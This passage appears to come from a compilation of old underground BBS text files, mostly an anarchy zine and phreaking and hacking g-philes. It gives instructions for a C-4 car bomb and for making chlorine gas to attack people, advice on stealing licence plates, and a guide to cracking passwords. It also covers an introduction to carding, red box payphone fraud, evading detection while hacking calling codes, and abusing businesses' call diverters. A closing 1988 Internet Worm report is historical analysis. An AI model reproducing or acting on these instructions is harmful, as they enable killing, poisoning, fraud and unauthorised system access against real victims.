      furnish a base for covering and supporting fires.
******************************************************
*         Stratigies and Stratigic Thinking          *
* how stratigic thinking can mean success or failure *
******************************************************
   A good stratigy can be what allows you to win. The best stratigy is a
flexable one. One that can be changed slightly or can allow for the
unpredictability in people. One of the best stratigies is one that uses an
element taken from most magicians. All you do is distract someone so that they
don't notice the fact that they are sitting on 500 lbs of TNT. This is an
example of course, but you see my meaning where all you must do is get the
person is a position where they are VERY vulnerable. But, for DO NOT kill there
relatives and loved ones, because if you miss that person is going to kill YOU.
To illistrate my point I'll use an example from my hacking conquests. All I
usually do is release about 300 or so virii that are VERY detectable and
reletively harmless so the person(s) running the network get distracted by the
virii and don't notice (or think it's a symtom of the virii) when all THEIR
passwords have been changed and all that's on the system is games or porno
graphics or something like that.
************************************
*           C-4 Car bomb           *
************************************
Special thanks go out to Panther for giving me the idea for this and a fan
of this mag for requesting it.
All ya do is take the C-4 (with the detonator in it) put it under the driver's
seat and run wires from it to the Automobile Coil or Tesla Coil. With this
method it ensures that the person will be in the car when it goes because the
necessary voltage to detonate it will not be produced until the engine is
running at high RPM's. Isn't that just neato!!!!!
Well that's about it for this issue of Mercinary Today, sorry for the long
wait but I've had MANY projects to do (like the pipe bomb belt and I had to
disassemble my guns and clean them.)

Sniper rifles
~~~~~~~~~~~~~
   The choice for the best sniper rifle depends on how far your target will be
from you. For 100-1000 yards my top choice is the M1 Garand which is a kick
ass rifle. The only problem is, if you shoot with your left hand then you
can't use a scope because it uses top ejection so the scope of mounted on top
and to the left. If you know that nothing will be in the way (including leaves)
then you can use an M16 (semi-auto of course) since it has high velocity and
you can easily get a silencer for it. You could also use an M21 which is a
modification of the M14 rifle it's fairly good at long range.

   This is mainly for short range, mafia type murders. Here I will give some
stats on some handguns from around the world.

****************************
*  How to get connections  *
****************************
    The best way to get the connections needed to get all this stuff is to
go to parties a lot get to know a lot of people, most people who deal in
weapons also deal in drugs. So just get to be REALLY good friends with them.
The things to remember when dealing with arms dealers is: don't rip them off,
and don't piss them off. (this is mostly common sense) These guys are usually
really good at what they do and don't want some punk kid fucking it up for them
so don't piss them off.

   Welcome all you mercinaries to be, sorry about the wait for this issue
but I've been having problems of a personal nature (basically I got busted
for some things). I'm planning on having Mercinary Today 10 out by September
and it will be the aniversary issue. It is going to ROCK, I've got LOTS in
store for that one!!

* The Art of Gassing *
**********************
   The best gases are the simple ones to make. Such as Clorine, hydrogen 
(doesn't really suffocate anyone but if they light a match you'll have fun)
Carbon Dioxide, Carbon Monoxide, Most of the Oxides of Nitrogen and florine
dioxide. Most of these (with the exception of hydrogen) suffocate your enemy
and some even torch their lungs :). Most are readily available (except for
florine dioxide) and some you can even make like Clorine (be CAREFUL!) all
ya do is mix ammonia and bleach. (a little reminder DO NOT MAKE INDOORS)
   
^^^^^^^^^^^^^^^^^^^^^^^^^^
^ Choosing a good Knife  ^
^^^^^^^^^^^^^^^^^^^^^^^^^^
   The best knives to have are called balistic knives, basically what they
do is when you pull the pin the blade shoots (YES, shoots!) a effective
range of 25-30 feet. Unfortunately, anyone who lives in Canada gets caught
even carrying something like this, gets a few free nights in jail. But fear
not, there are a group of fairly good knives that spring open quick and are
almost invisible at night. These are the Spyderco series of knives (no I'm
not a sales rep for them), they come in a flat black finish which is on the
blade as well as the handle and are simple to open one handed. They come
in a variety of sizes from the ladybug model to the rather large endura model
(which I happen to own myself) the only thing that you can actually see
(I mean it is reflective) is 2 pins on the handle (which your hand should be
on anywayz) and the edge on the blade (which is only visible on one side).
These and excellent knives and are VERY tough.
************************************
* How to Choose a Get-Away Vehicle *
************************************
   Choosing a get-away vehicle is fairly easy and ya do is find a fairly
common vehicle that is fairly fast and not too conspicuous (BTW, Don't use
a stolen vehicle borrow it from a friend or something). Then, you look around
in parking lots for a car that looks like the one you have (I mean exact)
then you steal their liscence plates, chances are they won't report it.
Then, you put them on your get-away car (remembering to keep your old ones
with you), do your business then drive away replace the plates and throw the
lifted plates in a dumpster somewhere. And there you have it. You lessen your
chances of getting caught and it didn't cost you any thing.

                    Fundamentals of UNIX passwords
                    ------------------------------
                          By: Mr. Slippery


I will answer the following questions:

What are good passwords? What are bad passwords? Why does UNIX
system V require 6 character passwords with funny characters?
How long would it take to break ANY 6 character password.

In 1981, Rober Morris and Ken Thompson wrote up their findings about
passwords. The document is called "Password Security - A Case History"
and is present in the documentation for some versions of UNIX.

They did a survey of various systems ands found that out of 3,289
passwords 15 were a single character, 72 were 2 characters long,
464 were 3 chars, 477 where 4 alphanumeric, 706 were 5 letters,
605 were 6 letters, all lower case and 492 appeared in various
dictionaries. 86% of the passwords were thus easily breakable if
you have a password hacker and access to the password file. This
is why UNIX V requires a minimum 6 characters some of which must
not be letters.

The article also said that some "good" things to try are dictionary
entries with the words spelled backwards, list of first names, last
names, street names, city names, (try with an inital upper case
letter as well), valid license plate numbers in your state, room
numbers, telephone numbers and the like.

Some others have suggested that people use woman's names (with a
trailing digit), their logins repeated or massaged (login abc,
password abcabc, cbacba), anything in the "GECOS" (comment) field of
the password file and anything significant that you know about the
person (their kid's name).

But what about trying every possible password? How long would it take?
The article had some numbers based on a PDP 11/70. It showed that 6
character passwords were too hard to break by exhaustive search if
someone was forced to use more than just letters and numbers. Using
all 95 printable characters, it would take a PDP 11/70 about 33 years
to try all of them. BUT TIMES ARE CHANGING. One fine weekend I tried
the same experiement with a modern 25MHz computer. From 33 years its
down to 6 months. If you have access to a mainframe or cray, it could
be a matter of days or weeks to break a password.

Of course, this is not something that would go unnoticed. Using up all
the resources of a CRAY would show up but over a long weekend, who
knows? If people are paying attention to the system activity (sar)
they will notice that you've used up all the system resources and
start asking potentially embarresing questions.

If you have a bunch of friends to help and divide up the job,
it could be a lot faster. Naturally though, it has to be worth your
time and effort. Someone running Xenix or MINIX on a PC is hardly
worth the effort.

And if the person was using 7 or 8 character passwords it would take
just too long.

If you examine the password encryptation method that UNIX uses, you
will notice that a 'salt' is used. This can have 4K (4,096 for the
uninitiated) values so generating every possible password IN ADVANCE
would take 4K times whatever the time required so its not worth the
attempt either.

How long will the 'door' be open? This fact that people are getting
better and better at guessing passwords in not lost on all concerned.
AT&T has put something called "password shadowing" in their latest
release (V.3.2). Basically what they did is to make the password file
unreadable by anyone but root. This stops people from taking the
password file to another machine and working on it at leasure. SUN and
IBM are doing similar things (hang around USENIX/Uniforum when the
shows come to your town to see what they are up to).

Well, what is this all leading up to? Are people going to give up
their hobby? Just between you and me, I kind of doubt it. Password
'shadowing' is optional, after all. People will still choose bad
passwords or even no passwords. Many people will not load the lastest
operating systems.

On the other hand, its not only UNIX systems that people choose bad
passwords for. I assume that I could break many hackers and phreaks
passwords on various boards but that would be unfriendly and get me
into trouble, so I won't try :-) (for the novice, this is a smiley
face and means that I'm joking :-( is a frown). Those out there who
are sysops might want to see what people choose for passwords since
I assume we're almost as lazy as other people. Me, I don't use
anything that you could guess except on one board that had trouble
with a special characters!

Writing a password cracker: On UNIX, at least, this is simple assuming
you have access to the 'domestic' version. The 'international' version
has the crypt function deleted. I don't know why they bothered since
all the KGB has to do is visit any one of 10,000 sites with UNIX
source code but I guess the government likes to play "lets pretend".

By the way, in case you are waiting for a nice cheap FAST DES chip to
come out, the UNIX people did not exactly use DES. They diddled it a
bit to stop hardware from making the job too fast.

I assume that the principles I've talked about here apply to other
operating systems. Some are a LOT easier. The earlier versions of the
Pick operating system did not even encrypt the passwords. All you had
to do was to 'dump' the right 'frame' of disk to see them! I think
that some of the mainframe packages such as RACF or ACF2 don't encrypt
but I'm not 100% sure.

A final thought: one thing to look for in general are assumptions made
a number of years ago that people have not reexamined. Exhaustive
searches of 6 character passwords is just one example. I'm sure there
are others.

                    ELECTRONIC FUNDS TRANSFER SYSTEMS
                    ---------------------------------
                WRITTEN BY: THE LINE BREAKER & CODE CRACKER


As a respond from The Master Hacker we have written this g-phile
for those of you are either new or have no knowledge of carding.
This is a 5-part g-phile covering all areas of using a credit
card for carding.  Part 1 is mainly a explaintion of how credit
cards go through clearing houses and to the customers statement.


ELECTRONIC FUNDS TRANSFER SYSTEMS
--------------------------------->


EFTS can broadly be described as computer data collection and
relecommunication
techniques that electronically transport information about the movement of
funds between accounts managed by financial institutions.

THE IMPETUS FOR EFT SERVICES
---------------------------->

With the adoption of the MICR (Magnetic Ink Character recognition) stand in
I Think about 1959, the banking industry took the first step toward
facilitating computerized handling of the growing number of checks used
in America.  By the 70's paper check processing had reached a level where
more than 37 billion individual pieces of paper moved through the banking
system annually.  In 1983 at the present rate of growth, it was anticipated
that this number would reach 55 billion.

Two general approaches are being follwoed in an effort to reduce the
burden of check processing:  the elimination of or supplant of check
transactions by electronic messages and the reduction of the physical
transport of paper.

REPLACEMENT OF CHECK TRANSACTIONS BY ELECTRONIC MESSAGES
-------------------------------------------------------->

Examples are the installation of automated teller machines (ATMs) by
financial institutions to provide on-line computerized banking
services, the development of automated clearinghouse services (such
as checkless payroll deposits) and telephone bill-paying services
which allow customers to enter bill paying information directly in
electronic form to a bank's computer through Touchtone telephones.

Automated teller machines are unattended computer terminal-type devices
that offer most of the services avaiable from a teller.  They
are actived by a customer through the combined use of a plastic card
with a magnetic strip bearing machine readable account
information, and a special secret number known only by the
customer (termed a PIN or personal Identification number).
Among the services offered through these machines are cash
withdrawls, transfers of funds between accounts, and account
balance inquiry.  Although early development of these machines
was restricted to providing off-line cash despensing, almost all
new ATM installations are on-line to the financial institution's
account database.

Automated clearinghouses (ACHs) are regional computer centers
fun for the most part by the federal reserve system and
concentrating thier activities on the processing of
pre-authorized electronic deposits or withdrawls from checking
accounts maintained by financial institutions.

Typical volume in the early 80's was over 11 million electronic
items per month submitted to the ACHs primarily on magnetic tape
for sorting and redistribution.  The predominant types of
electronic items processed by the 32 ACHs were military payroll
and social security electronic deposits.  Other types of
transactions include withdrawl of funds to pay bills
pre-authorized by the customer for payment.  Electronic deposits
or withdrawls destined for a F.I. not served by a specific
regional ACH are transmitted via telecommunications links to the
appropriate regional ACH for local redistribution.

Bill paying by telephone is another popular EFT service designed
to elimate paper check mailing and processing.  In its most
basic form, the service involves customer-direct input by a
touchtone telephone to a computer of the data necessaty to
generate electronic withdrawls from a account maintained by the
cusotmer and an electronic deposit to an account maintained by
the billing company.  Deposits destined for a company that does
not maintain an account with the customer's bank can be routed
through the local ACH for delivery to an appropriate bank.


REDUCTION OF PAPER FLOW
----------------------->

Truncation of the physical transport of paper bearing
instructions for the movement of funds between accounts is
another EFT application.  For example, efforts to truncate the
flow of checks through the use of image processing techniques
are under development.  The thrust of this effort is to create
electronic images of checks at the point of first deposit and to
transmit only these images to the customer or customers's bank.

The national credit card clearing and settlement system are
other examples of such truncation systems.  When a customer uses
Visa or Mastercard to make a purchase, he or she normally is not
dealing with a merchant who has an account with the financial
institution that has issued the card.  As a result, the evidence
of the completed sale in the past was physically forwarded to
the merchant's contracting bank for credit to the merchant's
account and then on to the card-issuing banl for posting to the
customer's statement.  In 1978, national systems were installed
by the two competing bankcard organizations which truncated the
flow of this paper at the merchant's bank of deposit  and
forwared only an electronic message to the card issurer for
posting to the cardholders statement.  These systems were later
expanded to include worldwide bankcard sales.  The system that
supports this electronic transmission fpr Visa cards processed
over 60 million customer purchases per month during the latter
part of 1985, or approximately 60% of all Visa card sales worldwide.
The Visa system transmits this sales data overnight in a form
which can be directly posted to a customer's descriptive billing
statement through a network linking together 250 Visa bank
processing centers in Europe, Canada, and the U.S.  Magnetic
tapes are sent to the balance of Visa banks operating in more
than 125 countries throughout the rest of the world.
As a result of the implemention of these two systems, both
national systems have uniformly adopted cardholder billing
statements which simply list a description of the sale without
including a copy of the sales receipt.
telephone numbers and password format.  Gaining access to the
ACH will give to all the information about credit cards needed.

               THE HACKER MENACE AND ELECTRONIC BULLETIN BOARDS
               ------------------------------------------------
                         Typed by: $ode $racker

This was taken out of the Network Security Magazine published by Datapro
Research.  I found this article to be quite funny along with antinque
news.  So I thought I share it with you for a laugh or whatever.

Also this article was written by a EX-HACKER! How does one become a
EX-HACKER, please tell me!!!!



HACKER GANGS
------------>

Early computer hackers tended to be college students.  With the advent
of home computers, and the teaching of computer basics at the grade
school level, the average age of the begininning (youth) hacker has
dropped to only 14!!  The overwhelming majority of BBS owners and users
are teenagers.  Teens tend to form cliques and peer groups, so the
formation of phone phreak and hacker gangs was inevitable.  The parents
of these bright teens usually do not, themselves, understand the power
of the computer.  This means that the teens are not subject to the same
parental restrictions that would govern their using the family car.

Many parents veiw the home computer as an excellent baby-sitting device.
If their child spends an evening quietly in his/her room with the computer
the parents feel that thier offspring is not getting into any trouble.
In reality, these teens may be engaging in electronic gang activites
that have very serious implications.  Losses to the software industry
alone are staggering!!!

Unfortunately, many of the gang leaders are older, more experienced
teens, perhaps college students.  These people are interested in hacking
not for its intellectual challenge, for for its financial rewards.  A
few gang leaders are adults who are politically or financially motivated.
There are serveral adults who are major figures behind the cracking and
distribution of pirated software for resale to the public.  One
adult gang leader openly solicited credit card numbers from the
juvenile members in exchange for fraudulently obtained hard disk drives
and other equipment.  Some of the teenage leaders seek notoriety and
acclaim from their peers.  They strive to be the biggest phreaker or
to have broken into the greatest number of computer systems.

The gangs may be local in nature such as the infamous "Milwaukee 414
gang"; they may be national in nature, like the "Inner Circle"; or
even international.  One such international group is "NYSHII" or
"CHAOS" both cracking and pirating clubs with headquaters in both
West Germany and the United States.  All of these groups had a BBS
that was their main base of operations and served supposedly as a
sercure communications center.  The 414s had a private BBS that was
so sercet it didn't even have a namme.  The Inner Circle had a
Securityland BBS and Illegitimate accounts on GTE'S Telemail network.
Chaos operates on a variety of BBS's in both the U.S. and West Germany.
NYSHII (New York Safehouse II) to this date has baffled local and
international law enforcement agencys as to it's true whereabouts.
The Sysop "The Line Breaker" has found a way of changing the BBS's
location on a weekly basis without moving the master computer.

ORGANIZED CRIME AND THE BBS
--------------------------->

Naturally, an underground BBS could be used by organized crime in
much the same manner as the teen hacker gangs use them.  The author
has good reason to believe thgat organized crime is controlling a
number of BBS systems in the Midwest, the New York City area, and
in Florida.  One informant claims there is a bbs that is located
in an off-track betting parlor.  Teenagers are easily recruited to
act as information gathers for organized crime.  The young people
work for little or nothing and, in most cases, do not even know
that they are being used.  The author and other adult hackers have
been approached and offered large sums of money to tamper with
banking and credit data computer systems.  Organized crime is
moving into this new area of crime.  There is a real and present
danger if BBSs continue to be alloowed to operate unchecked.

Underground BBSs may be creating a whole new generation of
criminals.  As the youthful hackers mature, their interest in hacking
as an intellectual challenge and rebellion against authority
may be replaced by profit motive.  College students always seem
to need money and the teens who do not go to college may find it
difficult to obtain a job.  It is only natural that these individuals
would graviate into hacking for personal gain.  For example, many
bulletin boards cater to those who are involved in credit card fraud.
There is also evidence that drug dealers use BBSs to arrange swaps
of stolen property for drugs.  Hackers who have learned how to access
credit bureau systems, such as TRWs, have discovered that making
unauthorized credit checks for credit card thieves is a lucrative
business.

Credit bureau computer penetrations are routine in the hacker under-
ground.  The typical hacker gang obtains credit card numbers from
discarded charge slip carbons.  As an alternative, one or more
hackers who work in retail establishments may supply card numbers.
Other gang members can then check the cards for credit limits and
expiuration dates by using the telephone or illegally accessing
credit bureau computers.  Others in the gang set up mail drops
and safe houses for the deliverly of the merchandise ordered by mail
and charged to the credit card numbers.  Since the gangs know no
geographic boundaries, it is difficult to investigate these frauds.

Some commerical time-sharing services, such as Comp-u-serve, allow
merchandise to be ordered via computer and shipped to the user's
address.  ime-sharing accounts are easily obtained with a stolen
credit card.  This allows the thief to order merchandise with little
fear of being traced.  These new high tech thieves are replacing
more traditional criminals.

The hackers and phone phreaks have knowledge and skill to completly
disrupt major communication and computer networks.  All that is lacking
is organization, planning and financing.  If enemy power should
infiltrate and organize this underground, the consequences could
be disastrous.

              -=-=<*   Red and Green boxes revived   *>=-=-
                       ---------------------------
                           By: Pink Panther


        Probably most of the information I am about to tell you, you
probably already know or have it stored somewhere.  But I have seen
quite a lot of questions on the subject lately, and thought to
explain a couple of things.
        Blue boxing has been dead for quite some time since
everything went to ESS, and the same with black boxing.  The
latest form of boxing is red and green boxing.  They both deal
with fortress phones and can only be used with a fortress phone.
        With a red box, you dial a number at a fortress, insert
a nickel, which is the ground check, and play the tape.  It will
emulate coins being dropped into the fortress.  Since there is
also questions on what are and how to get these tones, I've
created a simple step process:

     1)  Obtain a recorder that you can directly hook into
         a fone line.  If you use a regular recorder, you will
         need some modification on it.  If you have an answering
         machine, then you have it made.

     2)  Find a fortress, and follow the metal pipe (usually
         metal) from the fortress to where ever it ends up.
         At somepoint on the pipe, there will be a small box which
         is held together by two screws.  Unscrew the box.

     3)  You now should find two bolts with wires connected
         to them.  The wires are 22 gauge (which is fairly
         thin wire).  If you see thicker wires, such
         as 12 gauge wires, these are 220 volt AC lines,
         usually connected to the light in the phone booth.
         Do not touch the AC lines, unless you are stupid.
         Connect the tape recorder to the proper bolts, which
         means the 22 gauge wire.

     4)  Now dial a long distance fone number, and you will
         get a recordering to insert some money.  Insert about
         $6.00 in quarters, then hang up and your money will
         be returned.  The tones should have been recorded
         with a normal tape with no dolby.

     5)  Obtain a recorder with a built in speaker, or
         rip apart a phone set and obtain the earpiece.  If
         there is a diode across the earpiece, remove it.
         Connect the earpiece to the output of the recorder.
         (I recommend using an earpiece rather than a built
         in speaker).

     6)  To test your tones, dial 0-959-1230 from a fortress,
         and you should get 'Coin Test ... Please Deposit ... .'
         Play back the tones you recorded and if everything
         goes well, you should hear 'Quarter' everytime a tone
         is played.  Remember you only recorded quarter tones.
         You can record any tones you want by inserting different
         coins at the recording stage.  If you are having problems,
         try adjusting the volume.

     7)  To use, dial a non-local number, insert a real nickel,
         and play the tones.  Make sure you have enough tones
         on the recorder to complete the call.


        Now I will explain a little about what exactly happens
when you deposit coins.  When you deposit a coin, it goes through
a series of tests, determining what type of coin it is.  It
will be deposited in various coin slots within the fortress itself
if everything goes right.  But before it is deposited in the
right slot it will cause a wheel to be turned.  A nickel will
turn the wheel once, a dime twice, and quarter five times.  This
will cause a frequency to be generated which is sent to a
operator or computer.  A capacitor is placed across the
speech circuit while these tones are generated so that the
customer does not here them.  Here are the tones and PPS (pules
per second):

                 Nickel:  1 beep   5-8.5 PPS
                   Dime:  2 beeps  5-8.5 PPS
                Quarter:  5 beeps  12-17 PPS


        A green box allows the caller on the fortress to get his
money back.  It will generate the tones for coin collect, coin
return, and ringback.  This is basically what an operator uses.
A green box cannot be used on a fortress, but must be used by the
called party.  An operator release signal must be sent before
any tones from the green box are sent.  This contains of
a 2600hz tone for 90ms, then 60ms silence, then 2600hz for
900ms.  This all must be done within the three minute collect
period.  Anyway, here are the tones:

                Ringback:  700hz+1700hz
             Coin Return:  1100hz+1700hz
            Coin Collect:  700hz+1700hz


        I hope this has enlighted the few without such knowledge.
If you are confused, then don't phuck with this stuff, and get
out of phreaking.

                        A notice to All Phreakers
                        -------------------------
                         Written By - The Jedi


    In this time and age, phreaking is becoming more and more difficult. I
can remember a time when there was such an abundance of codes, all you had to
do was set up your favorite code hacking program and wait a couple of
minutes.
There was never a worry about getting busted and people often posted dozens of
codes at a time. Now that Sprint and MCI are starting to catch on to things by
extending the length of codes and such, its harder to get them and more
dangerous if you get caught. Everyone decent phreaker knows this already, its
no big secret. But, while the art of phreaking hasn't really changed much in
the past few years, the techniques that these companies are using to catch
phreakers has! I'm writing this article to warn those who hack out codes
extensively.
    Working for a Fortress Phone Company does have it's advantages. I've
managed to read a couple of magazines about fortress phones and the companies
that use them. I recently stumbled across an article concerning long-distance
communication fraud entitled "Fraud Prevention- Taking The Offensive". Since
what I've read in the article was news to me, I figured that a few people out
there might also be interested.
    It seems that one company has devised a way of disguising good codes
while
someone is hacking them in real-time! The following is taken from that
article:

      "We have written software in our DCO-CS [Digital Central Office-Carrier
   Switch] that can detect when one of these hackers is at work by recognizing
   the patterns they frequently use..... Usually a hacker will hit one code,
   two codes, three codes, etc. - they usually follow some sort of pattern".
      "By using their computers to perform a set of mathematical procedures,
   or algorithms, hackers have been able to determine authorized calling
codes.
   We use the algorithms to figure out what he's dailed so far and then
   determine where he's going next"
      "If he's going to what we know is a good code, then we will make it look
   like a bad code for his call only. If he does hit that good code, he won't
   be able to get through."
      "If he's using a random pattern with his off code, he's probably using
   either the same number he's calling to, which we can monitor by watching
   the successive call to that same number, or we can monitor the fact that
   he's hitting 'x' number of bad off codes in a row."

   As of now, the only company that using this method is Sprint but from what
I see, it's getting popular. 19 People have been arrested recently by
employing this system.


BEWARE:
-------

1 - First of all, it'll make good codes look bad - Making every phreaker run
    in circles, never finding a decent code.
2 - It works in real-time. That is, you're constantly being monitored.
3 - It gives a printout of all the information which CAN BE USED AS EVIDENCE
    IN COURT.
4 - While it's not always possible for them to get the originating phone
    number, they sometimes get help from the connecting carrier. Which means
    my friends, the bbs that you're calling to hack to.


My Suggestions:
---------------

1 - First of all, make the calls as random as possible. Using a code hacker
    that hacks codes in sequencial order is out of the question!!
2 - Don't make too many attempts at one time. The less you hack at a given
    time, the less you are suspected of phreaking.
3 - Use multiple extenders and target carriers.
4 - Don't use the same good code to often. If you do, at least don't call the
    same place 100 times! The person that owns that code will report the
    activity and they'll catch up with the person you're calling to.
5 - Stay away from Sprint. They're really good at this shit, don't mess around
    with them unless you know what you're doing. Try to stick with hacking
    codes from the newer, less sophisticated companies that don't employ this
    system.


    If you stick to those general rules, you shouldn't have too much trouble.
Even the company that makes this system [Stromberg-Carlson Co.] admits that
it's impossible to stop phreaking altogether. Those of you that are new to
phreaking and stuff like it, educate yourselves BEFORE you dive into it.
Remember, we're all in this together, if you get busted calling a
pirate/hack/phreak/anarchy bbs. They'll get a hold of the user list and posts
and bust everyone on the system. Don't ever rat on anyone!!!
    Well, thats about it for me. Look for my new text files out soon on
fortress phones.And call...

---------------------------------------
This file isn't "How to use a diverter",
it's more like "how to get lots of them
as fast as I can to make confrences and
trace-free calls without getting nailed"
I will discuss several ways to do this..
I wrote the text file in 40 column even
though I have 80 so everyone vith 40 col
can read it easily. And so when/if you
print it out you can waste half the
paper!!

---------------------------------------
HOW TO FIND THEM: METHOD ONE-
needed-
   The Yellow Pages
   touch tone phone
   Your areas ANI phone number

Okay. Open the phone book to PLUMBERS.
Find one that says 24 hour service
or something like that. Dial the #.
Let it ring. You should hear a click,
then a ring. that is the call diverting.
the other ring often sounds different.
get the other people to hang up. now,
THIS IS VITAL: DONT ANNOY THEM! They're
not dumb and will catch on if you do.
ask in  foreigner type voice "Is Abdul
there?" or something like that. they
will hang up. Wait for a dial tone,
then dial the ANI number. Thats the
thing when you dial it it reads back
your number. if it says your number,
then its not  a diverter. Try another
plumber and take your business elsewhere
but if  it reads a different number, its
a diverter.. It wont be the number you
dialed though. Write down the number you
dialed somewhere. Now you have a diverter.
Other people to do this to are Doctors,
Electricians, or anyone with 24-hour
service in their ad.
---------------------------------------
Problems with diverters:
---------------------------------------
Some diverters have security features
in them to keep out the big bad phreaks.
For example, Radio Shack  sells
diverters. They hang up on you(and
disconnect the call) either after five
or ten minutes, depending on what the
owner sets a switch to. I hate those.
Also, some diverters click when used.
every minute or so. If you dial
ALLIANCE and it wont go though, then
dial 10288 first then alliance.
this will rout the call through AT&T.
---------------------------------------
Why Diverters Are Superior:
---------------------------------------
Often if you use a diverter thats local
to you you get a great connection. Why?
Your dialing off of its dial tone as if
it was your own, but not getting billed
of course. Diverters dont trace or have
ANI like those nasty 950 companies.
They reach any number that you can..
If you call a number that traces with
a diverter(Gvmt/TRW/etc) it gets the
DIverter number and not yours. You
are safe, the Plumber/Doctor has some
serious explaining to do to the feds.
As well as a large phone bill that
he dosent know where it all came from.
Phun at its best!!!
---------------------------------------
HOW TO FIND THEM: METHOD TWO-
---------------------------------------
you need-
     A PAYPHONE(unless your in
                Crossbar, but still
                WATCH OUT!)
     The number to the Credit Operator

I reccomend using a payphone for this
one since you are screwing with your
local telco who dosent like you much.

Ok, dial the credit op. Ask for the
AT&T CREDIT OPERATOR. They should put
on some lame recording. Wait till its
over then wait for a dial tone. Hit
9+1+Area Code and Phone Number.
This is convenient if you have no
quarter. This is how it works:
1) you call credit op and ask
   for at&t credit op
2) Op hits button to DIAL number
   with recording. Op lets go
   of button to talk to you(IE: goes
   on to next person with ques.)
3) Recording Ends. It hangs up but
   you dont. you get a dial tone:
   THE CREDIT OPS DIAL TONE!!!
4) Dial 9+1+Area Code and Number.

I reccomend hitting 9+ANI the first
time you do this to make sure it works in your area.

                     A REPORT ON THE INTERNET WORM

                               Bob Page
                          University of Lowell
                      Computer Science Department

                            November 7, 1988

Here's the scoop on the "Internet Worm".  Actually it's not a virus -
a virus is a piece of code that adds itself to other programs,
including operating systems.  It cannot run independently, but rather
requires that its "host" program be run to activate it.  As such, it
has a clear analog to biologic viruses -- those viruses are not
considered live, but they invade host cells and take them over, making
them produce new viruses.

A worm is a program that can run by itself and can propagate a fully
working version of itself to other machines.  As such, what was loosed
on the Internet was clearly a worm.

This data was collected through an emergency mailing list set up by
Gene Spafford at Purdue University, for administrators of major
Internet sites - some of the text is included verbatim from that list.
Mail was heavy since the formation of the list; it continues to be on
Monday afternoon - I get at least 2-3 messages every hour.  It's
possible that some of this information is incomplete, but I thought
you'd like to know what I know so far.

The basic object of the worm is to get a shell on another machine so
it can reproduce further.  There are three ways it attacks: sendmail,
fingerd, and rsh/rexec.


THE SENDMAIL ATTACK:

In the sendmail attack, the worm opens a TCP connection to another
machine's sendmail (the SMTP port), invokes debug mode, and sends a
RCPT TO that requests its data be piped through a shell.  That data, a
shell script (first-stage bootstrap) creates a temporary second-stage
bootstrap file called x$$,l1.c (where '$$' is the current process ID).
This is a small (40-line) C program.

The first-stage bootstrap compiles this program with the local cc and
executes it with arguments giving the Internet hostid/socket/password
of where it just came from.  The second-stage bootstrap (the compiled
C program) sucks over two object files, x$$,vax.o and x$$,sun3.o from
the attacking host.  It has an array for 20 file names (presumably for
20 different machines), but only two (vax and sun) were compiled in to
this code.  It then figures out whether it's running under BSD or
SunOS and links the appropriate file against the C library to produce
an executable program called /usr/tmp/sh - so it looks like the Bourne
shell to anyone who looked there.


THE FINGERD ATTACK:

In the fingerd attack, it tries to infiltrate systems via a bug in
fingerd, the finger daemon.  Apparently this is where most of its
success was (not in sendmail, as was originally reported).  When
fingerd is connected to, it reads its arguments from a pipe, but
doesn't limit how much it reads.  If it reads more than the internal
512-byte buffer allowed, it writes past the end of its stack.  After
the stack is a command to be executed ("/usr/ucb/finger") that
actually does the work.  On a VAX, the worm knew how much further from
the stack it had to clobber to get to this command, which it replaced
with the command "/bin/sh" (the bourne shell).  So instead of the
finger command being executed, a shell was started with no arguments.
Since this is run in the context of the finger daemon, stdin and
stdout are connected to the network socket, and all the files were
sucked over just like the shell that sendmail provided.


THE RSH/REXEC ATTACK:

The third way it tried to get into systems was via the .rhosts and
/etc/hosts.equiv files to determine 'trusted' hosts where it might be
able to migrate to.  To use the .rhosts feature, it needed to actually
get into people's accounts - since the worm was not running as root
(it was running as daemon) it had to figure out people's passwords.
To do this, it went through the /etc/passwd file, trying to guess
passwords.  It tried combinations of: the username, the last, first,
last+first, nick names (from the GECOS field), and a list of special
"popular" passwords:

[I wouldn't have picked some of these as "popular" passwords, but
then again, I'm not a worm writer.  What do I know?]

When everything else fails, it opens /usr/dict/words and tries every
word in the dictionary.  It is pretty successful in finding passwords,
as most people don't choose them very well.  Once it gets into
someone's account, it looks for a .rhosts file and does an 'rsh'
and/or 'rexec' to another host, it sucks over the necessary files into
/usr/tmp and runs /usr/tmp/sh to start all over again.


Between these three methods of attack (sendmail, fingerd, .rhosts)
it was able to spread very quickly.


THE WORM ITSELF:

The 'sh' program is the actual worm.  When it starts up it clobbers
its argv array so a 'ps' will not show its name.  It opens all its
necessary files, then unlinks (deletes) them so they can't be found
(since it has them open, however, it can still access the contents).
It then tries to infect as many other hosts as possible - when it
sucessfully connects to one host, it forks a child to continue the
infection while the parent keeps on trying new hosts.

One of the things it does before it attacks a host is connect to the
telnet port and immediately close it.  Thus, "telnetd: ttloop: peer
died" in /usr/adm/messages means the worm attempted an attack.

The worm's role in life is to reproduce - nothing more.  To do that it
needs to find other hosts.  It does a 'netstat -r -n' to find local
routes to other hosts & networks, looks in /etc/hosts, and uses the
yellow pages distributed hosts file if it's available.  Any time it
finds a host, it tries to infect it through one of the three methods,
see above.  Once it finds a local network (like 129.63.nn.nn for
ulowell) it sequentially tries every address in that range.

If the system crashes or is rebooted, most system boot procedures
clear /tmp and /usr/tmp as a matter of course, erasing any evidence.
However, sendmail log files show mail coming in from user /dev/null
for user /bin/sed, which is a tipoff that the worm entered.

Each time the worm is started, there is a 1/15 chance (it calls
random()) that it sends a single byte to ernie.berkeley.edu on some
magic port, apparently to act as some kind of monitoring mechanism.


THE CRACKDOWN:

Three main 'swat' teams from Berkeley, MIT and Purdue found copies of
the VAX code (the .o files had all the symbols intact with somewhat
meaningful names) and disassembled it into about 3000 lines of C.  The
BSD development team poked fun at the code, even going so far to point
out bugs in the code and supplying source patches for it!  They have
not released the actual source code, however, and refuse to do so.
That could change - there are a number of people who want to see the
code.

Portions of the code appear incomplete, as if the program development
was not yet finished.  For example, it knows the offset needed to
break the BSD fingerd, but doesn't know the correct offset for Sun's
fingerd (which causes it to dump core); it also doesn't erase its
tracks as cleverly as it might; and so on.

The worm uses a variable called 'pleasequit' but doesn't correctly
initialize it, so some folks added a module called _worm.o to the C
library, which is produced from:
        int pleasequit = -1;
the fact that this value is set to -1 will cause it to exit after one
iteration.

The close scrutiny of the code also turned up comments on the
programmer's style.  Verbatim from someone at MIT:
    From disassembling the code, it looks like the programmer
    is really anally retentive about checking return codes,
    and, in addition, prefers to use array indexing instead of
    pointers to walk through arrays.

Anyone who looks at the binary will not see any embedded strings -
they are XOR'ed with 81 (hex).  That's how the shell commands are
